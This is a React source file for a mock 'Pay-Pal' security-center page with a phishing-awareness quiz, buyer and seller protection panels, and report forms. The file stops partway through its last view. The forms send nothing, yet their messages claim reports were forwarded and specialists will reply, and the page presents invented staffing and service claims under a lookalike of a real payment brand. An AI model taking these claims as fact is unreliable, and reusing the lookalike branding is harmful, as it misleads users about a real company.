'use client';

import React, { useState, useEffect } from 'react';
import { 
  motion, 
  AnimatePresence 
} from 'motion/react';
import { 
  ChevronDown, 
  ChevronRight, 
  ArrowRight, 
  X, 
  ShieldAlert, 
  ShieldCheck, 
  HelpCircle, 
  Mail, 
  AlertTriangle, 
  GraduationCap, 
  Trophy, 
  Plus, 
  ShoppingCart, 
  Store, 
  Lock, 
  EyeOff, 
  UserPlus, 
  Scale, 
  CheckCircle2, 
  Globe, 
  RefreshCw, 
  PhoneCall, 
  User, 
  Info, 
  ExternalLink 
} from 'lucide-react';
import Header from '@/components/Header';

// --- IN-APP STRUCTURAL DATA ---

const quizQuestions = [
  {
    question: "You receive an email from 'service-verification@paypol-security-alerts.com' claiming your account is locked and asking you to log in via a link to unlock it. What do you do?",
    options: [
      "Click the link immediately to prevent losing access to your money.",
      "Log in through the link, but change your password immediately after.",
      "Ignore the link. Forward the email to phishing@Pay-Pal.com and delete it."
    ],
    correctIndex: 2,
    feedback: "Correct! Pay-Pal will never send alert links from unofficial lookalike domains. Always report phishing emails and log in directly through the official website."
  },
  {
    question: "You notice an unknown charge of $79.99 on your Pay-Pal account that you never made. What is your first response?",
    options: [
      "Open the Resolution Center to report unauthorized activity.",
      "Call the police and report a bank robbery.",
      "Email the merchant directly to ask what they sold you."
    ],
    correctIndex: 0,
    feedback: "Spot on! Unauthorized transactions should be reported directly in the Resolution Center within 180 days to qualify for complete protection and reimbursement."
  },
  {
    question: "A buyer wants to pay for a laptop via Pay-Pal but insists on using their own local shipping service rather than yours. Should you proceed?",
    options: [
      "Yes, it saves you shipping fees and cuts packaging time.",
      "No, Seller Protection requires shipping to the address on the Transaction Details page using a trackable courier.",
      "Yes, as long as they send a picture of the shipping receipt."
    ],
    correctIndex: 1,
    feedback: "Correct! To be covered by Seller Protection, you must ship to the address listed on the details page with verifiable, trackable shipping details."
  },
  {
    question: "What is the most secure way to safeguard your Pay-Pal login from unauthorized access?",
    options: [
      "Use the same password you use for other websites so you don't forget it.",
      "Enable Two-Factor Authentication (2FA) and use a strong, unique password.",
      "Write your password down on a sticky note attached to your computer monitor."
    ],
    correctIndex: 1,
    feedback: "Exactly! A unique password paired with Two-Factor Authentication (2FA) is your strongest shield against online credential threat attacks."
  },
  {
    question: "A stranger sends you $500 'by mistake' on Pay-Pal and asks you to send it back to their personal bank account. What is the safest action?",
    options: [
      "Send it back to their bank account as they requested, to be helpful.",
      "Keep the money and buy something nice.",
      "Do not send money elsewhere. Contact Support or use the official refund link on the transaction details page."
    ],
    correctIndex: 2,
    feedback: "Great job! This is a common chargeback scam. Always reverse/refund the original transaction within the app, rather than sending a new payment, to avoid losing both."
  }
];

export default function SecurityCenter() {
  // --- STATE DECLARATIONS ---
  
  const [activeTab, setActiveTab ] = useState<'security-center' | 'protection-tips' | 'quiz'>('security-center');
  
  // Tab selector for Buyer vs Seller Protection
  const [protectionType, setProtectionType] = useState<'buyer' | 'seller'>('buyer');
  
  // Accordion active index
  const [activeFaq, setActiveFaq] = useState<number | null>(null);

  // Modals visibility
  const [showPhishingModal, setShowPhishingModal] = useState(false);
  const [showFraudModal, setShowFraudModal] = useState(false);
  const [showContactModal, setShowContactModal] = useState(false);

  // Active hover nav indicators (simulating a live menu)
  const [hoveredNav, setHoveredNav] = useState<string | null>(null);

  // Toast Notification state
  const [toastMessage, setToastMessage] = useState<string | null>(null);

  // Quiz interactive state
  const [currentQuestion, setCurrentQuestion] = useState(0);
  const [quizScore, setQuizScore] = useState(0);
  const [selectedOption, setSelectedOption] = useState<number | null>(null);
  const [quizSubmitted, setQuizSubmitted] = useState(false);
  const [quizFinished, setQuizFinished] = useState(false);

  // Forms values (fully managed for proper feel)
  const [phishingForm, setPhishingForm] = useState({ sender: '', url: '', details: '' });
  const [fraudForm, setFraudForm] = useState({ date: '', amount: '', type: '', details: '' });
  const [contactForm, setContactForm] = useState({ name: '', email: '', message: '' });

  // --- ACTIONS & UTILITIES ---

  const triggerToast = (message: string) => {
    setToastMessage(message);
    setTimeout(() => {
      setToastMessage(null);
    }, 4000);
  };

  const handleTabChange = (tab: 'security-center' | 'protection-tips' | 'quiz') => {
    setActiveTab(tab);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  const handleFaqToggle = (index: number) => {
    setActiveFaq(activeFaq === index ? null : index);
  };

  const handleQuizAnswer = (optionIndex: number) => {
    if (quizSubmitted) return; // Answer already lock-in
    setSelectedOption(optionIndex);
    setQuizSubmitted(true);
    if (optionIndex === quizQuestions[currentQuestion].correctIndex) {
      setQuizScore(prev => prev + 1);
    }
  };

  const handleNextQuestion = () => {
    if (currentQuestion + 1 < quizQuestions.length) {
      setCurrentQuestion(prev => prev + 1);
      setSelectedOption(null);
      setQuizSubmitted(false);
    } else {
      setQuizFinished(true);
    }
  };

  const handleRestQuiz = () => {
    setCurrentQuestion(0);
    setQuizScore(0);
    setSelectedOption(null);
    setQuizSubmitted(false);
    setQuizFinished(false);
  };

  const handlePhishingSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setShowPhishingModal(false);
    triggerToast('Phishing report forwarded to safety team! Thank you for maintaining vigilance.');
    setPhishingForm({ sender: '', url: '', details: '' });
  };

  const handleFraudSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setShowFraudModal(false);
    triggerToast('Dispute file successfully opened. Our analyst team will contact you within 24 hours.');
    setFraudForm({ date: '', amount: '', type: '', details: '' });
  };

  const handleContactSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setShowContactModal(false);
    triggerToast('Your ticket was queued safely. A Pay-Pal cybersecurity specialist will email you in 1-2 hours.');
    setContactForm({ name: '', email: '', message: '' });
  };

  const scrollToQuiz = () => {
    setActiveTab('quiz');
    setTimeout(() => {
      const quizElement = document.getElementById('quiz-card-container');
      if (quizElement) {
        quizElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }
    }, 100);
  };

  return (
    <div id="paypol-root" className="min-h-screen flex flex-col font-sans select-none overflow-x-hidden antialiased text-[#2C2E2F] bg-white">
      
      {/* Top banner removed per design request */}

      {/* 2. MAIN HEADER NAVIGATION */}
      <Header />

      {/* 3. SUB NAVIGATION (TABS BAR) */}
      <section className="bg-white border-b border-[#E2E4E6] sticky top-[80px] z-30 shadow-xs">
        <div className="max-w-4xl mx-auto px-4 h-14 flex items-center justify-between">
          <div className="flex items-center">
            <button 
              onClick={() => handleTabChange('security-center')}
              className={`font-semibold text-xs sm:text-sm px-4 py-2 rounded-full cursor-pointer flex items-center gap-1.5 transition-all ${
                activeTab === 'security-center' 
                  ? 'bg-[#E6F0FA] text-[#003087]' 
                  : 'text-[#6C7378] hover:text-[#003087]'
              }`}
            >
              <span>Security Center</span>
              {activeTab === 'security-center' && (
                <ArrowRight size={12} className="text-[#003087]" />
              )}
            </button>
          </div>

          <div className="flex items-center gap-4 sm:gap-6">
            <button 
              onClick={() => handleTabChange('protection-tips')}
              className={`font-bold text-xs sm:text-sm py-4 px-1 relative transition-colors cursor-pointer ${
                activeTab === 'protection-tips' ? 'text-[#003087]' : 'text-[#6C7378] hover:text-[#003087]'
              }`}
            >
              Protection Tips
              {activeTab === 'protection-tips' && (
                <motion.div 
                  layoutId="activeUnderline" 
                  className="absolute bottom-0 left-0 right-0 h-[3px] bg-[#0079C1] rounded-full" 
                />
              )}
            </button>
            <button 
              onClick={() => handleTabChange('quiz')}
              className={`font-bold text-xs sm:text-sm py-4 px-1 relative transition-colors cursor-pointer ${
                activeTab === 'quiz' ? 'text-[#003087]' : 'text-[#6C7378] hover:text-[#003087]'
              }`}
            >
              Discover and Learn
              {activeTab === 'quiz' && (
                <motion.div 
                  layoutId="activeUnderline" 
                  className="absolute bottom-0 left-0 right-0 h-[3px] bg-[#0079C1] rounded-full" 
                />
              )}
            </button>
          </div>
        </div>
      </section>

      {/* MAIN VIEW CONTROLLER PANEL */}
      <main className="flex-1 w-full bg-white pb-16">
        
        {/* --- VIEW 1: SECURITY CENTER --- */}
        {activeTab === 'security-center' && (
          <motion.div
            initial={{ opacity: 0, y: 15 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.4 }}
            className="w-full"
          >
            {/* Hero Section */}
            <section className="text-center py-12 px-4 max-w-4xl mx-auto">
              <h1 className="font-display font-bold text-3xl sm:text-4xl md:text-5xl text-[#003087] tracking-tight leading-tight select-none">
                Your security is our priority
              </h1>
            </section>

            {/* Grid Layout Cards */}
            <section className="max-w-5xl mx-auto px-4 md:px-6 mb-12">
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-12 gap-6">
                
                {/* Experiencing Issue Card (lg:span-5 / multi layout) */}
                <div className="lg:col-span-6 bg-[#F5F7FA] rounded-2xl p-6 md:p-8 flex flex-col justify-between shadow-xs border border-[#E2E4E6] hover:shadow-md transition-shadow">
                  <div>
                    <h2 className="font-display text-xl sm:text-2xl font-bold text-[#003087] leading-tight mb-4 text-left">
                      Experiencing a security issue right now?
                    </h2>
                    <p className="text-sm md:text-base text-[#6C7378] mb-8 text-left">
                      We&apos;re here to help you take action to get things sorted out quickly and securely.
                    </p>
                  </div>

                  {/* Interactive Issues List */}
                  <ul className="flex flex-col gap-4">
                    <li 
                      onClick={() => setShowFraudModal(true)}
                      className="bg-white border-1.5 border-[#E2E4E6] hover:border-[#0079C1] rounded-xl p-4 flex items-center justify-between cursor-pointer transition-all hover:translate-x-1 hover:shadow-xs group"
                    >
                      <div className="flex items-center gap-3.5">
                        <div className="w-10 h-10 rounded-full bg-[#0079C1]/10 text-[#0079C1] flex items-center justify-center shrink-0">
                          <ShieldAlert size={18} />
                        </div>
                        <div className="text-left">
                          <h4 className="font-bold text-sm sm:text-base text-[#2C2E2F]">Unauthorised activity</h4>
                          <p className="text-xs text-[#6C7378]">Report a transaction you don&apos;t recognise</p>
                        </div>
                      </div>
                      <ChevronRight size={16} className="text-[#6C7378] group-hover:text-[#0079C1] group-hover:translate-x-0.5 transition-all" />
                    </li>

                    <li 
                      onClick={() => setShowPhishingModal(true)}
                      className="bg-white border-1.5 border-[#E2E4E6] hover:border-[#0079C1] rounded-xl p-4 flex items-center justify-between cursor-pointer transition-all hover:translate-x-1 hover:shadow-xs group"
                    >
                      <div className="flex items-center gap-3.5">
                        <div className="w-10 h-10 rounded-full bg-[#0079C1]/10 text-[#0079C1] flex items-center justify-center shrink-0">
                          <Mail size={18} />
                        </div>
                        <div className="text-left">
                          <h4 className="font-bold text-sm sm:text-base text-[#2C2E2F]">Phishing or spoofing</h4>
                          <p className="text-xs text-[#6C7378]">Forward suspicious emails or text messages</p>
                        </div>
                      </div>
                      <ChevronRight size={16} className="text-[#6C7378] group-hover:text-[#0079C1] group-hover:translate-x-0.5 transition-all" />
                    </li>

                    <li 
                      onClick={scrollToQuiz}
                      className="bg-white border-1.5 border-[#E2E4E6] hover:border-[#0079C1] rounded-xl p-4 flex items-center justify-between cursor-pointer transition-all hover:translate-x-1 hover:shadow-xs group"
                    >
                      <div className="flex items-center gap-3.5">
                        <div className="w-10 h-10 rounded-full bg-[#0079C1]/10 text-[#0079C1] flex items-center justify-center shrink-0">
                          <GraduationCap size={18} />
                        </div>
                        <div className="text-left">
                          <h4 className="font-bold text-sm sm:text-base text-[#2C2E2F]">Interactive Safety Quiz</h4>
                          <p className="text-xs text-[#6C7378]">Test your knowledge on cyber threats</p>
                        </div>
                      </div>
                      <ChevronRight size={16} className="text-[#6C7378] group-hover:text-[#0079C1] group-hover:translate-x-0.5 transition-all" />
                    </li>
                  </ul>
                </div>

                {/* Card 2: Fraud Activations */}
                <div className="lg:col-span-3 bg-[#F8F9FA] rounded-2xl overflow-hidden shadow-xs border border-[#E2E4E6] flex flex-col hover:-translate-y-1 hover:shadow-md transition-all">
                  <div className="relative h-40 bg-[#0070BA] flex items-end justify-center select-none overflow-hidden">
                    {/* SVG Illustration Header */}
                    <div className="w-full flex items-center justify-center pb-2">
                      <svg width="220" height="140" viewBox="0 0 220 140" fill="none" className="max-w-full h-auto">
                        <rect x="25" y="45" width="170" height="70" rx="8" fill="#F0B939"/>
                        <rect x="25" y="45" width="45" height="70" rx="8" fill="#D99E1C" fillOpacity="0.3"/>
                        <path d="M47.5 70C47.5 76.5 44 82 39 84.5C34 82 30.5 76.5 30.5 70V61L39 57.5L47.5 61V70Z" fill="#1C5AB8"/>
                        <path d="M39 59.5V82.5C42.5 80.5 45 76.5 45 70V62L39 59.5Z" fill="#3D82E6"/>
                        <path d="M35 70L38 73L43 66" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
                        <rect x="80" y="58" width="65" height="10" rx="3" fill="white" fillOpacity="0.8"/>
                        <text x="84" y="65" fill="#5C4103" fontFamily="Inter" fontSize="6" fontWeight="700">Security alert</text>
                        <rect x="80" y="78" width="85" height="4" rx="2" fill="white" fillOpacity="0.6"/>
                        <rect x="80" y="86" width="60" height="4" rx="2" fill="white" fillOpacity="0.6"/>
                        <circle cx="175" cy="55" r="16" fill="#14BD7A" fillOpacity="0.2"/>
                        <circle cx="175" cy="55" r="12" fill="#14BD7A"/>
                        <path d="M172 56V52.5C172 50.8 173.3 49.5 175 49.5C176.7 49.5 178 50.8 178 52.5V56M170 56H180V61H170V56Z" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                      </svg>
                    </div>
                  </div>
                  <div className="p-6 flex-1 flex flex-col justify-between">
                    <h3 className="font-display font-bold text-lg text-[#003087] leading-snug mb-4 text-left">
                      Fraud and unusual account activity
                    </h3>
                    <button 
                      onClick={() => setShowFraudModal(true)}
                      className="text-[#0079C1] hover:text-[#005EA6] font-bold text-sm inline-flex items-center gap-1.5 mt-auto group text-left cursor-pointer"
                    >
                      <span>Report fraud</span>
                      <ArrowRight size={14} className="group-hover:translate-x-1 transition-transform" />
                    </button>
                  </div>
                </div>

                {/* Card 3: Suspicious Message */}
                <div className="lg:col-span-3 bg-[#F8F9FA] rounded-2xl overflow-hidden shadow-xs border border-[#E2E4E6] flex flex-col hover:-translate-y-1 hover:shadow-md transition-all">
                  <div className="relative h-40 bg-[#0070BA] flex items-end justify-center select-none overflow-hidden">
                    {/* SVG Illustration Header */}
                    <div className="w-full flex items-center justify-center pb-2">
                      <svg width="220" height="140" viewBox="0 0 220 140" fill="none" className="max-w-full h-auto">
                        <g filter="url(#shadow-filter)">
                          <rect x="30" y="25" width="130" height="42" rx="6" fill="white"/>
                          <path d="M30 45L22 50L26 40" fill="white"/>
                        </g>
                        <circle cx="45" cy="38" r="8" fill="#F03E3E"/>
                        <text x="43" y="44" fill="white" fontFamily="Inter" fontSize="12" fontWeight="800">!</text>
                        <rect x="60" y="32" width="85" height="4" rx="2" fill="#E9ECEF"/>
                        <rect x="60" y="42" width="70" height="4" rx="2" fill="#E9ECEF"/>
                        <rect x="60" y="52" width="45" height="4" rx="2" fill="#E9ECEF"/>

                        <g filter="url(#shadow-filter)">
                          <rect x="50" y="65" width="140" height="46" rx="6" fill="white"/>
                          <path d="M190 85L198 90L194 80" fill="white"/>
                        </g>
                        <circle cx="68" cy="80" r="9" fill="#1C5AB8"/>
                        <path d="M65 80H71M71 80L69 78M71 80L69 82" stroke="white" strokeWidth="1.8" strokeLinecap="round"/>
                        <rect x="82" y="74" width="95" height="12" rx="3" fill="#E7F5FF"/>
                        <text x="86" y="82" fill="#1C5AB8" fontFamily="Inter" fontSize="6" fontWeight="700">FWD: phishing@Pay-Pal.com</text>
                        <rect x="82" y="92" width="95" height="3" rx="1.5" fill="#CED4DA"/>

                        <defs>
                          <filter id="shadow-filter" x="15" y="15" width="180" height="80" filterUnits="userSpaceOnUse" colorInterpolationFilters="sRGB">
                            <feDropShadow dx="0" dy="3" stdDeviation="3" floodColor="#000000" floodOpacity="0.08"/>
                          </filter>
                        </defs>
                      </svg>
                    </div>
                  </div>
                  <div className="p-6 flex-1 flex flex-col justify-between">
                    <h3 className="font-display font-bold text-lg text-[#003087] leading-snug mb-4 text-left">
                      Suspicious email or text message
                    </h3>
                    <button 
                      onClick={() => setShowPhishingModal(true)}
                      className="text-[#0079C1] hover:text-[#005EA6] font-bold text-sm inline-flex items-center gap-1.5 mt-auto group text-left cursor-pointer"
                    >
                      <span>Report suspicious messages</span>
                      <ArrowRight size={14} className="group-hover:translate-x-1 transition-transform" />
                    </button>
                  </div>
                </div>

              </div>
            </section>

            {/* Support CTA Blue Banner */}
            <section className="max-w-5xl mx-auto px-4 md:px-6 mb-12 animate-fade-in">
              <div className="bg-[#0070BA] text-white rounded-2xl px-6 py-8 md:px-12 md:py-10 flex flex-col md:flex-row items-center justify-between gap-6 shadow-sm">
                <p className="font-display text-lg sm:text-xl font-bold tracking-tight text-center md:text-left">
                  Need help with a security issue?
                </p>
                <button 
                  onClick={() => setShowContactModal(true)}
                  className="bg-white text-[#003087] hover:bg-[#F5F7FA] font-bold px-8 py-3.5 rounded-full text-sm inline-flex items-center gap-2 shadow-md transition-all hover:-translate-y-0.5 active:translate-y-0 cursor-pointer"
                >
                  <span>Contact us</span>
                  <ArrowRight size={14} className="text-[#003087]" />
                </button>
              </div>
            </section>

            {/* Bottom Multi-Card Redirect Panel */}
            <section className="bg-[#F5F7FA] py-14 border-t border-[#E2E4E6] mt-4">
              <div className="max-w-4xl mx-auto px-4 grid grid-cols-1 md:grid-cols-2 gap-6">
                
                {/* Redirect Card 1 */}
                <div className="bg-white rounded-2xl p-8 shadow-xs border border-transparent hover:border-[#E2E4E6] transition-all flex flex-col justify-between">
                  <div>
                    <h3 className="font-display text-xl font-bold text-[#003087] mb-3 text-left">Take steps to protect</h3>
                    <p className="text-[#6C7378] text-sm leading-relaxed mb-6 text-left">
                      Follow these best practices to help prevent unauthorised access to your account and devices.
                    </p>
                  </div>
                  <button 
                    onClick={() => handleTabChange('protection-tips')}
                    className="text-[#0079C1] hover:text-[#005EA6] font-bold text-sm inline-flex items-center gap-1.5 group justify-start cursor-pointer w-fit"
                  >
                    <span>Get protection tips</span>
                    <ArrowRight size={14} className="group-hover:translate-x-1 transition-transform" />
                  </button>
                </div>

                {/* Redirect Card 2 */}
                <div className="bg-white rounded-2xl p-8 shadow-xs border border-transparent hover:border-[#E2E4E6] transition-all flex flex-col justify-between">
                  <div>
                    <h3 className="font-display text-xl font-bold text-[#003087] mb-3 text-left">Learn more about security</h3>
                    <p className="text-[#6C7378] text-sm leading-relaxed mb-6 text-left">
                      Stay up-to-date on fraud trends to better protect yourself and explore how Pay-Pal secures your info.
                    </p>
                  </div>
                  <button 
                    onClick={() => handleTabChange('quiz')}
                    className="text-[#0079C1] hover:text-[#005EA6] font-bold text-sm inline-flex items-center gap-1.5 group justify-start cursor-pointer w-fit"
                  >
                    <span>Learn about your security</span>
                    <ArrowRight size={14} className="group-hover:translate-x-1 transition-transform" />
                  </button>
                </div>

              </div>
            </section>
          </motion.div>
        )}

        {/* --- VIEW 2: PROTECTION TIPS --- */}
        {activeTab === 'protection-tips' && (
          <motion.div
            initial={{ opacity: 0, y: 15 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.4 }}
            className="w-full text-center"
          >
            {/* Protection Hero Title */}
            <section className="py-12 px-4 max-w-4xl mx-auto">
              <h1 className="font-display font-bold text-3xl sm:text-4xl md:text-5xl text-[#003087] tracking-tight leading-tight select-none mb-3">
                Protecting You, Every Day
              </h1>
              <p className="text-base sm:text-lg text-[#6C7378] max-w-xl mx-auto leading-relaxed">
                Our buyer and seller safeguards keep you and your money safe.
              </p>
            </section>

            {/* Buyer / Seller Selectors */}
            <section className="max-w-md mx-auto px-4 mb-10">
              <div className="bg-[#F5F7FA] p-1 rounded-full flex w-full">
                <button
                  onClick={() => setProtectionType('buyer')}
                  className={`flex-1 py-3 rounded-full text-sm font-semibold transition-all cursor-pointer ${
                    protectionType === 'buyer' 
                      ? 'bg-white text-[#003087] shadow-xs font-bold' 
                      : 'text-[#6C7378] hover:text-[#003087]'
                  }`}
                >
                  Buyer Protection
                </button>
                <button
                  onClick={() => setProtectionType('seller')}
                  className={`flex-1 py-3 rounded-full text-sm font-semibold transition-all cursor-pointer ${
                    protectionType === 'seller' 
                      ? 'bg-white text-[#003087] shadow-xs font-bold' 
                      : 'text-[#6C7378] hover:text-[#003087]'
                  }`}
                >
                  Seller Protection
                </button>
              </div>
            </section>

            {/* Interactive Dynamic Checklist Panel */}
            <section className="max-w-3xl mx-auto px-4 mb-16">
              <AnimatePresence mode="wait">
                {protectionType === 'buyer' ? (
                  <motion.div
                    key="buyer-panel"
                    initial={{ opacity: 0, scale: 0.98 }}
                    animate={{ opacity: 1, scale: 1 }}
                    exit={{ opacity: 0, scale: 0.98 }}
                    transition={{ duration: 0.25 }}
                    className="bg-white border border-[#E2E4E6] rounded-2xl p-6 sm:p-10 md:p-12 shadow-sm text-center"
                  >
                    <div className="w-16 h-16 rounded-full bg-[#0079C1]/10 text-[#0079C1] flex items-center justify-center mx-auto mb-6 text-2xl">
                      <ShoppingCart size={28} />
                    </div>
                    <h2 className="font-display text-2xl font-bold text-[#003087] mb-4">Protecting Buyers</h2>
                    <p className="text-sm sm:text-base text-[#6C7378] leading-relaxed max-w-xl mx-auto mb-8">
                      If an eligible item you&apos;ve purchased online doesn&apos;t arrive, or doesn&apos;t match the seller&apos;s description, we&apos;ll reimburse you for the full amount of the item plus shipping costs, as long as the eligibility requirements are met.
                    </p>

                    <div className="max-w-md mx-auto text-left flex flex-col gap-5">
                      <div className="flex gap-4 items-start">
                        <CheckCircle2 className="text-[#14BD7A] shrink-0 mt-0.5" size={20} />
                        <div>
                          <h4 className="font-bold text-sm sm:text-base text-[#2C2E2F]">Full Reimbursement</h4>
                          <p className="text-xs text-[#6C7378]">Covers online shopping, auction purchases, and digital goods.</p>
                        </div>
                      </div>

                      <div className="flex gap-4 items-start">
                        <CheckCircle2 className="text-[#14BD7A] shrink-0 mt-0.5" size={20} />
                        <div>
                          <h4 className="font-bold text-sm sm:text-base text-[#2C2E2F]">180-Day Dispute Window</h4>
                          <p className="text-xs text-[#6C7378]">You have 180 days from the transaction date to report issues.</p>
                        </div>
                      </div>

                      <div className="flex gap-4 items-start">
                        <CheckCircle2 className="text-[#14BD7A] shrink-0 mt-0.5" size={20} />
                        <div>
                          <h4 className="font-bold text-sm sm:text-base text-[#2C2E2F]">Secure Payments</h4>
                          <p className="text-xs text-[#6C7378]">Sellers never see your credit card or full bank details.</p>
                        </div>
                      </div>
                    </div>

                    <a href="#" onClick={(e) => { e.preventDefault(); triggerToast("Simulated link: Navigating to deep Buyer Protection terms."); }} className="font-semibold text-sm text-[#0079C1] hover:text-[#005EA6] inline-flex items-center gap-1.5 mt-8 hover:underline">
                      More about Buyer Protection <ChevronRight size={14} />
                    </a>
                  </motion.div>
                ) : (
                  <motion.div
                    key="seller-panel"
                    initial={{ opacity: 0, scale: 0.98 }}
                    animate={{ opacity: 1, scale: 1 }}
                    exit={{ opacity: 0, scale: 0.98 }}
                    transition={{ duration: 0.25 }}
                    className="bg-white border border-[#E2E4E6] rounded-2xl p-6 sm:p-10 md:p-12 shadow-sm text-center"
                  >
                    <div className="w-16 h-16 rounded-full bg-[#0079C1]/10 text-[#0079C1] flex items-center justify-center mx-auto mb-6 text-2xl">
                      <Store size={28} />
                    </div>
                    <h2 className="font-display text-2xl font-bold text-[#003087] mb-4">Protecting Sellers</h2>
                    <p className="text-sm sm:text-base text-[#6C7378] leading-relaxed max-w-xl mx-auto mb-8">
                      Pay-Pal&apos;s Seller Protection helps protect eligible transactions against claims of unauthorised payments and items that were not received. We&apos;ve got your back on all online checkout points.
                    </p>

                    <div className="max-w-md mx-auto text-left flex flex-col gap-5">
                      <div className="flex gap-4 items-start">
                        <CheckCircle2 className="text-[#14BD7A] shrink-0 mt-0.5" size={20} />
                        <div>
                          <h4 className="font-bold text-sm sm:text-base text-[#2C2E2F]">Transaction Guarantee</h4>
                          <p className="text-xs text-[#6C7378]">Protects physical goods, tickets, services, and digital downloads.</p>
                        </div>
                      </div>

                      <div className="flex gap-4 items-start">
                        <CheckCircle2 className="text-[#14BD7A] shrink-0 mt-0.5" size={20} />
                        <div>
                          <h4 className="font-bold text-sm sm:text-base text-[#2C2E2F]">24/7 Security Scanning</h4>
                          <p className="text-xs text-[#6C7378]">Continuous AI transaction audits to preemptively flag fraudulent buyers.</p>
                        </div>
                      </div>

                      <div className="flex gap-4 items-start">
                        <CheckCircle2 className="text-[#14BD7A] shrink-0 mt-0.5" size={20} />
                        <div>
                          <h4 className="font-bold text-sm sm:text-base text-[#2C2E2F]">Dispute Resolution Support</h4>
                          <p className="text-xs text-[#6C7378]">Dedicated staff to review chargeback disputes and help submit shipping proof.</p>
                        </div>
                      </div>
                    </div>

                    <a href="#" onClick={(e) => { e.preventDefault(); triggerToast("Simulated link: Navigating to deep Seller Protection policies."); }} className="font-semibold text-sm text-[#0079C1] hover:text-[#005EA6] inline-flex items-center gap-1.5 mt-8 hover:underline">
                      More about Seller Protection <ChevronRight size={14} />
                    </a>
                  </motion.div>
                )}
              </AnimatePresence>
            </section>

            {/* Why is Pay-Pal Safe section */}
            <section className="max-w-5xl mx-auto px-4 md:px-6 py-8 border-t border-[#E2E4E6]">
              <h2 className="font-display font-bold text-2xl sm:text-3xl text-[#003087] mb-4">
                Why is Pay-Pal Safe?
              </h2>
              <p className="text-sm sm:text-base text-[#6C7378] max-w-3xl mx-auto leading-relaxed mb-12">
                As a pioneer in online payments, we set the standard for fraud prevention by delivering holistic security solutions to minimise fraud across major payment types and channels—including online, offline or mobile payments.
              </p>

              {/* Grid 6 points */}
              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-8">
                
                {/* Safe Point 1 */}
                <div className="flex flex-col items-center group">
                  <div className="w-14 h-14 rounded-full bg-[#E6F0FA] text-[#003087] flex items-center justify-center text-lg mb-4 group-hover:scale-110 group-hover:rotate-[5deg] transition-all duration-350">
                    <Lock size={20} />
                  </div>
                  <h4 className="font-bold text-base text-[#003087] mb-2">Information well-guarded</h4>
                  <p className="text-xs sm:text-sm text-[#6C7378] leading-relaxed text-center">
                    Your security is our top priority. We combine world-class anti-fraud detection with 24/7 account monitoring to keep you safe. Your personal and financial details are securely encrypted on servers protected against logical attacks.
                  </p>
                </div>

                {/* Safe Point 2 */}
                <div className="flex flex-col items-center group">
                  <div className="w-14 h-14 rounded-full bg-[#E6F0FA] text-[#003087] flex items-center justify-center text-lg mb-4 group-hover:scale-110 group-hover:rotate-[5deg] transition-all duration-350">
                    <RefreshCw size={20} />
                  </div>
                  <h4 className="font-bold text-base text-[#003087] mb-2">Real-time fraud prevention</h4>
                  <p className="text-xs sm:text-sm text-[#6C7378] leading-relaxed text-center">
                    When it comes to fraud, it&apos;s vital to stay one step ahead and we&apos;ve got the global guard to match. Incoming transactions are monitored and analysed within milliseconds to identify and help prevent fraud before it occurs.
                  </p>
                </div>

                {/* Safe Point 3 */}
                <div className="flex flex-col items-center group">
                  <div className="w-14 h-14 rounded-full bg-[#E6F0FA] text-[#003087] flex items-center justify-center text-lg mb-4 group-hover:scale-110 group-hover:rotate-[5deg] transition-all duration-350">
                    <ShieldCheck size={20} />
                  </div>
                  <h4 className="font-bold text-base text-[#003087] mb-2">Account protection</h4>
                  <p className="text-xs sm:text-sm text-[#6C7378] leading-relaxed text-center">
                    Unlinked credit or debit card details to your Pay-Pal account only once. We&apos;ll keep your login and financial information secure so you can shop without exposing your card details to retail outlets.
                  </p>
                </div>

                {/* Safe Point 4 */}
                <div className="flex flex-col items-center group">
                  <div className="w-14 h-14 rounded-full bg-[#E6F0FA] text-[#003087] flex items-center justify-center text-lg mb-4 group-hover:scale-110 group-hover:rotate-[5deg] transition-all duration-350">
                    <Scale size={20} />
                  </div>
                  <h4 className="font-bold text-base text-[#003087] mb-2">Handling chargebacks</h4>
                  <p className="text-xs sm:text-sm text-[#6C7378] leading-relaxed text-center">
                    We provide the expertise and tools to help guide you through the process of resolving a chargeback, be it related to an unauthorised transaction or a buyer who didn&apos;t receive their item.
                  </p>
                </div>

                {/* Safe Point 5 */}
                <div className="flex flex-col items-center group">
                  <div className="w-14 h-14 rounded-full bg-[#E6F0FA] text-[#003087] flex items-center justify-center text-lg mb-4 group-hover:scale-110 group-hover:rotate-[5deg] transition-all duration-350">
                    <EyeOff size={20} />
                  </div>
                  <h4 className="font-bold text-base text-[#003087] mb-2">We never close</h4>
                  <p className="text-xs sm:text-sm text-[#6C7378] leading-relaxed text-center">
                    We monitor every account and transaction 24/7 to prevent fraud, email phishing, and identity theft. If anything seems suspicious, our dedicated team of 2,000 anti-fraud specialists will stand by you.
                  </p>
                </div>

                {/* Safe Point 6 */}
                <div className="flex flex-col items-center group">
                  <div className="w-14 h-14 rounded-full bg-[#E6F0FA] text-[#003087] flex items-center justify-center text-lg mb-4 group-hover:scale-110 group-hover:rotate-[5deg] transition-all duration-350">
                    <Globe size={20} />
                  </div>
                  <h4 className="font-bold text-base text-[#003087] mb-2">World-class security</h4>
                  <p className="text-xs sm:text-sm text-[#6C7378] leading-relaxed text-center">
                    We&apos;ve invested millions to build and evolve our best-in-class behavioural risk management system to block external threats, so you can transact with confidence.
                  </p>
                </div>

              </div>
            </section>
          </motion.div>
        )}

        {/* --- VIEW 3: DISCOVER AND LEARN (QUIZ & FAQS) --- */}
        {activeTab === 'quiz' && (
          <motion.div
            initial={{ opacity: 0, y: 15 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.4 }}
            className="w-full text-center"
          >
            {/* Cyber Security training hero header */}
            <section className="py-12 px-4 max-w-4xl mx-auto">
              <h1 className="font-display font-bold text-3xl sm:text-4xl md:text-5xl text-[#003087] tracking-tight leading-tight select-none mb-3">
                Cyber Security Training
              </h1>
